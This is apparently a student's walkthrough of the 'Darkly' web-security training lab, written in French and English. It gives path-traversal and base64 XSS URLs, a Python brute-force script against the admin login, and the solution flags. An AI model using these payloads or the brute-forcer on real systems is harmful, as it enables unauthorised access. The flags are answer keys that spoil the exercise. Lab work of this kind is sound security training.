# darkly

Open your web browser <br>

```c
Faire une redirection de port

Network Advanced 
Host ip: 127.0.0.1
Host port: 8080
Guest ip : 10.0.2.15
Gest Port 80

```

```c
1.✅
Forget Password
button submit , j'ai mit envoyer a mon adresse 
The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0

2.✅
Le site est mal sécurisé car le code PHP ne vérifie pas ce que tu demandes dans l'URL.
http://localhost:8080/index.php?page=../../../../../../../etc/passwd
The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 

3.✅

http://localhost:8080/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4=
The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d

Quand j'accede a cette page :
http://localhost:8080/index.php?page=media&src=...
le site decode la valeur de src.

on dit au navigateur du code base64
data:text/html;base64
on a encoder un alert() qui declenche un script cachet.


4.❌
Deux champs dans le formulaire:
Souvent c'est admin username.
username: admin
Pour le password j'ai fais un programme qui teste les 50 mots de passe les plus courant : <br>

#!/usr/bin/env python3
import requests

# Configuration
URL = "http://localhost:8080/index.php"

# Top 100 des mots de passe les plus utilisés (source: SecLists)
PASSWORDS = [
    "123456", "password", "123456789", "12345", "12345678", 
    "qwerty", "1234567", "111111", "123123", "admin",
    "1234567890", "letmein", "welcome", "monkey", "password1",
    "abc123", "1234", "dragon", "shadow", "sunshine",
    "master", "football", "123456a", "123", "aaron431",
    "password123", "123456b", "123456", "qwerty123", "admin123",
    "welcome1", "1q2w3e4r", "123qwe", "654321", "555555",
    "lovely", "7777777", "123abc", "11111", "123321",
    "mustang", "access", "starwars", "baseball", "superman",
    "batman", "trustno1", "hello", "jordan23", "123456q"
]

# Bruteforce
print("Starting brute force attack...")
for pwd in PASSWORDS:
    try:
        r = requests.get(URL, params={
            "page": "signin",
            "username": "admin",
            "password": pwd,
            "Login": "Login"
        })
        
        if "WrongAnswer" not in r.text:
            print(f"\n[+] SUCCESS! Password found: {pwd}")
            print(f"Response length: {len(r.text)} characters")
            exit()
            
        print(f"Trying: {pwd.ljust(15)} | Status: {r.status_code}", end='\r')
        
    except Exception as e:
        print(f"\nError with {pwd}: {str(e)}")
        continue

print("\n[-] Attack completed. No password found.")



The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2 


```c



```
















https://github.com/ChokMania/Darkly/blob/master/10-XSS_Reflected_Cross-site_Scripting/Ressources/explications.md




```
